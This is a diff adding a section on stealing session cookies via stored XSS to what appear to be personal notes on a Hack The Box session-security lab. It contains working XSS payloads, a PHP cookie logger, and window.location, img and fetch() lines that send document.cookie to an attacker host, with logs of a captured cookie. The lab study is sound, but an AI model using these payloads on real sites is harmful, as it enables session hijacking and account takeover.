@@ -17,6 +17,10 @@
         - [Java](#java)
         - [.NET](#net)
       - [Obtaining Session Identifiers Post-Exploitation - Database Access](#obtaining-session-identifiers-post-exploitation---database-access)
+    - [XSS](#xss)
+      - [Example](#example-2)
+        - [Obtaining session cookie through XSS](#obtaining-session-cookie-through-xss)
+        - [Obtaining session cookies through XSS (Netcat edition)](#obtaining-session-cookies-through-xss-netcat-edition)
 
 ---
 
@@ -229,3 +233,149 @@ select * from all_sessions where id=3;
 ![session no interaction 4](../../../images/session_no_interaction_4.png)
 
 Here you have successfully extracted the sessions!
+
+### XSS
+
+For an XSS attack to result in session cookie leakge, the following requirements must be fulfilled:
+
+- Session cookies should be carried in all HTTP requests
+- Session cookies should be accessible by JS code
+
+#### Example
+
+![xss 1](../../../images/session_security_xss1.png)
+
+In one field, you can specify the following payload:
+
+```javascript
+"><img src=x onerror=prompt(document.domain)>
+```
+
+You are using ```document.domain``` to ensure that JS is being executed on the actual domain and not in a sandboxed environment. JS being executed in a sandboxed environment prevents client-side attacks.
+
+In the remaining two fields, you specify the following two payloads.
+
+```javascript
+"><img src=x onerror=confirm(1)>
+```
+
+... and:
+
+```javascript
+"><img src=x onerror=alert(1)>
+```
+
+You will need to update the profile by pressing "Save" to submit the payloads.
+
+![xss 2](../../../images/session_security_xss2.png)
+
+
+When successful, you notice no payload being triggered. Often the payload code is not going to be called/executed until another application functionality triggers it. Go to "Share", as it is the only other functionality you have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vuln in such a functionality would be ideal from an attacker's perspective.
+
+![xss 3](../../../images/session_security_xss3.png)
+
+Checking if HTTPOnly flag is set:
+
+![xss 4](../../../images/session_security_xss4.png)
+
+... and it's turned off.
+
+##### Obtaining session cookie through XSS
+
+You identified that you could create and share publicly accessible profiles that contain your specified XSS payloads.
+
+The below PHP script can be hosted on a VPS to log cookies:
+
+```php
+<?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?>
+```
+
+It can be run like this:
+
+```bash
+d41y@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
+[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
+```
+
+And the JS payload can be:
+
+```javascript
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
+```
+
+_A sample HTTPS>HTTPS payload can be_:
+
+```javascript
+<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+To test it, you now need to simulate a victim that logs into his or her account and navigates to ```http://xss.htb.net/profile?email=ela.stienen@example.com```.
+
+Brings you the cookie:
+
+```bash
+┌──(d41y㉿user)-[~/ctf/htb/vpns]
+└─$ php -S 10.10.15.211:8000
+[Thu Jun  5 16:54:16 2025] PHP 8.3.6 Development Server (http://10.10.15.211:8000) started
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 Accepted
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 [404]: GET /log.php?c=auth-session=s%3AxPy0i5ab8K2Kqxr7XX83jApGWqisXRzW.Lg3WQ4lXpdexxCKvvaTOFqqNu51TUJ%2F%2Bavh0PcCEmQI - No such file or directory
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 Closing
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Accepted
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 [404]: GET /favicon.ico - No such file or directory
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Closing
+```
+
+##### Obtaining session cookies through XSS (Netcat edition)
+
+First, you need to place the payload into the vulnerable field and click "Save".
+
+Payload:
+
+```javascript
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+Also, instruct Netcat to listen on port 8000:
+
+```bash
+d41y@htb[/htb]$ nc -nlvp 8000
+listening on [any] 8000 ...
+```
+
+Simulating the victim and navigating to the shared profile of Ela, brings you the cookie when the victim hovers over "test":
+
+```bash
+┌──(d41y㉿user)-[~/ctf/htb/vpns]
+└─$ nc -lnvp 8000        
+Listening on 0.0.0.0 8000
+Connection received on 10.10.15.211 56118
+GET /?cookie=YXV0aC1zZXNzaW9uPXMlM0F4UHkwaTVhYjhLMktxeHI3WFg4M2pBcEdXcWlzWFJ6Vy5MZzNXUTRsWHBkZXh4Q0t2dmFUT0ZxcU51NTFUVUolMkYlMkJhdmgwUGNDRW1RSQ== HTTP/1.1
+Host: 10.10.15.211:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://xss.htb.net/
+Priority: u=4, i
+```
+
+You can no hijack the victim's session.
+
+>[!TIP]
+> You don't necessarily have to use the ```window.location()``` object that causes the victim to get redirected. You can use ```fetch()```, which can fetch data and send it to your server without any redirects. This is a stealthier way.<br>
+> Example:<br>
+> ```<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>```
+
